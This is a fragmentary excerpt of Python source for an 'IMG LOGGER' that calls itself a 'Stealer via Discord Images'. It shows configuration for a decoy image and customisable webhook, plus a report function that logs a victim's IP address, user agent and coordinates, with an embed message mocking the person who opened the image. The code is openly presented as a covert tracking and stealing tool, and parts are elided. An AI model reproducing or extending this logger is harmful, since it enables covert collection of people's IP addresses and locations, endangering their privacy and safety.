...
__app__ = "Zenit IMG LOGGER"
__description__ = "Zenit Stealer via Discord Images"
__version__ = "v1.26"
__author__ = "Zenit Logger"
...
config = {
    ...
    "image": "https://i.pinimg.com/1200x/32/1b/c3/1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoY.jpg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Zenit Logger", # Set this to the name you want the webhook to have
...
def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    ...
    "embeds": [
        {
            "title": "Zenit Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image! What a Fucking Loser!**
